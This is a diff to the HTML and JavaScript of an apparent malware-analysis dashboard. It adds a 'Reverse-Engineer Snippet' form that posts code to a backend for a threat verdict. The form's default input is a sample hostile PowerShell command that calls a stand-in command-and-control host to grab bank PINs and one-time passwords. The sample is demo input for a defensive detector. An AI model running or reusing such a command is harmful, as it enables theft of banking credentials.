@@ -109,9 +109,16 @@
     </div>
 
     <!-- Live GitHub URL Scanner Bar -->
-    <form onsubmit="scanLiveGitHubRepo(event)" style="display:flex; gap:10px; flex-wrap:wrap; margin-bottom:20px; background:var(--card); border:1px solid var(--border); padding:14px; border-radius:10px;">
+    <form onsubmit="scanLiveGitHubRepo(event)" style="display:flex; gap:10px; flex-wrap:wrap; margin-bottom:12px; background:var(--card); border:1px solid var(--border); padding:14px; border-radius:10px;">
       <input id="repoUrlInput" type="url" required placeholder="https://github.com/manjesh694/CogniGuard-AI" value="https://github.com/manjesh694/CogniGuard-AI" style="flex:1; min-width:240px; padding:10px 12px; border-radius:8px; border:1px solid var(--border); background:#030712; color:var(--text); font-size:13px;">
       <button type="submit" style="background:var(--accent); color:#060911; border:none; padding:10px 18px; border-radius:8px; font-weight:700; cursor:pointer; font-size:13px;">⚡ Scan Live GitHub Repo</button>
+    </form>
+
+    <!-- Live Payload Reverse-Engineer Bar -->
+    <form onsubmit="analyzeLiveSnippet(event)" style="display:flex; gap:10px; flex-wrap:wrap; margin-bottom:20px; background:var(--card); border:1px solid var(--border); padding:14px; border-radius:10px;">
+      <input id="snippetFileInput" type="text" required value="suspicious_invoice.vbs" style="width:180px; padding:10px 12px; border-radius:8px; border:1px solid var(--border); background:#030712; color:var(--text); font-size:13px;">
+      <input id="snippetBodyInput" type="text" required value="powershell -c curl http://c2.tld/grab_bank_pin_otp" style="flex:1; min-width:220px; padding:10px 12px; border-radius:8px; border:1px solid var(--border); background:#030712; color:var(--text); font-size:13px;">
+      <button type="submit" style="background:#f87171; color:#060911; border:none; padding:10px 18px; border-radius:8px; font-weight:700; cursor:pointer; font-size:13px;">🔍 Reverse-Engineer Snippet</button>
     </form>
 
     <!-- 20-Second Launch Video Demo -->
@@ -304,6 +311,42 @@
           <code style="color:#38bdf8;">python -m agent.cli bridge</code><br><br>
           Or pass a hosted backend URL via <code style="color:#38bdf8;">?api=https://your-api.onrender.com</code>.
         `;
+      }
+    }
+
+    async function analyzeLiveSnippet(event) {
+      event.preventDefault();
+      const filename = document.getElementById('snippetFileInput').value.trim();
+      const snippet = document.getElementById('snippetBodyInput').value;
+      shredBtn.style.display = 'none';
+      statusBadge.style.color = '#38bdf8';
+      statusBadge.innerText = '● REVERSE-ENGINEERING PAYLOAD...';
+
+      try {
+        const res = await fetch(resolveApiBase() + '/api/v1/reverse-engineer', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ filename, snippet })
+        });
+        const data = await res.json();
+        const isSafe = data.recommended_action === 'ALLOW';
+        statusBadge.style.color = isSafe ? '#10b981' : '#ef4444';
+        statusBadge.innerText = isSafe ? '● INTENT: CLEAN (ALLOW)' : `● INTENT: ${data.primary_target}`;
+        term.innerHTML = `
+          <span style="color:${isSafe ? '#10b981' : '#ef4444'};">${isSafe ? '✅' : '🚨'} [IN-MEMORY REVERSE ENGINEER] ${escapeHtml(data.filename)}</span><br>
+          • Primary Target: <strong>${escapeHtml(data.primary_target)}</strong><br>
+          • Threat Score: ${escapeHtml((data.threat_score * 100).toFixed(0))}%<br>
+          • Action: <strong>${escapeHtml(data.recommended_action)}</strong><br><br>
+          <em>"${escapeHtml(data.spoken_warning)}"</em>
+        `;
+        if (!isSafe) {
+          shredBtn.style.display = 'inline-block';
+          speak(data.spoken_warning);
+        }
+      } catch (err) {
+        statusBadge.style.color = '#fbbf24';
+        statusBadge.innerText = '● BRIDGE OFFLINE (DEMO FALLBACK)';
+        testReverseEngineering();
       }
     }
   </script>
